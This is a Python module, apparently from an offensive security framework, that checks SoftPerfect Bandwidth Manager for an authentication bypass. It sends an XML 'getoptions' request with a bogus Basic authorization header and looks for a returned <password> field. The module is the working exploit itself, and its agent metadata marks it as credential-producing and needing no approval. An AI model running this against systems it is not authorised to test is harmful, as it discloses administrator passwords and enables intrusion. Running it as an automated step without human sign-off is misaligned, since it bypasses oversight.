#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SoftPerfect Bandwidth Manager Basic Auth bypass / password disclosure."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SoftPerfect Bandwidth Manager - Auth Bypass Detection',
        'description': (
            'Detects SoftPerfect Bandwidth Manager auth bypass via Basic AAAA '
            'and XML getoptions returning <password>.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'softperfect', 'auth-bypass', 'info-disclosure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'credential', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/19002',
        ],
    }

    def run(self):
        xml = (
            '<?xml version="1.0"?>\n'
            '<request>\n'
            '    <command>getoptions</command>\n'
            '</request>'
        )
        r = self.http_request(
            method='POST',
            path='/',
            data=xml,
            headers={
                'Content-Type': 'text/xml',
                'Authorization': 'Basic AAAA',
            },
            allow_redirects=False,
        )
        if not r:
            return False
        body = r.text or ''
        if '<status>OK</status>' in body and re.search(r'<password>[^<]+</password>', body):
            self.set_info(
                severity='critical',
                reason='SoftPerfect Bandwidth Manager auth bypass',
                path='/',
            )
            return True
        return False
